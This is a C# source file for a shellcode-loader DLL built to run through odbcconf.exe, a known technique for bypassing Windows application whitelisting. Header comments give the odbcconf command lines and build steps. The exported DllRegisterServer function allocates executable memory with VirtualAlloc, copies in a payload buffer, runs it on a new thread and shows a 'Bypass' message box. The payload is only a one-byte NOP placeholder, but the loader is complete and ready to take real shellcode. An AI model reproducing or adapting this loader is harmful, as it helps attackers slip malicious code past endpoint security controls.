//odbcconf.exe /F file.rsp or odbcconf.exe /S /A {REGSVR "foo.dll"}

//Copy DLLExport.bat into the folder where .sln file is present --> double click --> Select "installed" --> select x64 --> click on drop down and select system.runtime.interopservices and apply
//It will be automatically reloaded --> click save
//now add reference to System.Management.Auotmation C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
//upon compilation, select Release and "Any CPU"
using System;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

public class odbc3
{

    [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
    public static bool DllRegisterServer()
    {

        byte[] buf = new byte[1] {0x90};
        int size = buf.Length;
                 IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
                 Marshal.Copy(buf, 0, addr, size);
                 IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                 WaitForSingleObject(hThread, 0xFFFFFFFF);

            MessageBox(IntPtr.Zero, "Execution happened", "Bypass", 0x00000000L);


        return true;
    }



    private const UInt32 StdOutputHandle = 0xFFFFFFF5;
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
    [DllImport("kernel32.dll")]
    private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
    [DllImport("kernel32")]
    static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, long type);

}